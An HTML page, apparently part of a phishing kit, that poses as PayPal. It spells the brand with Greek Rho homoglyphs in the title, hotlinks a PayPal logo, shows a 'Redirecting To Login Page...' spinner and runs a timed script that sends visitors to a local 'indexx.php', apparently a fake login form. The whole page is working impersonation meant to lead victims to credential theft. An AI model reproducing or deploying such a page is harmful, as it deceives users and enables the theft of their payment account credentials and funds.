<html><head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>&Rho;ay&Rho;al: Request and Send Payments Online.</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body><br><br><br>
<center> <img height="180" width="250" src="http://tous-logos.com/wp-content/uploads/2017/09/Logo-PayPal.png" class="center"></center>
<center> <img style="margin-top:20px;" src="https://www.mts.com.vn/Eclipse-1s-200px.gif" class="center" width="100px" height="100px"></center>
<center>
<h2>
Redirecting To Login Page...</h2> </center>
<script type="text/javascript">
        window.setTimeout("location=('../../../../indexx.php');", 3000);
    </script>


</a></div></body></html>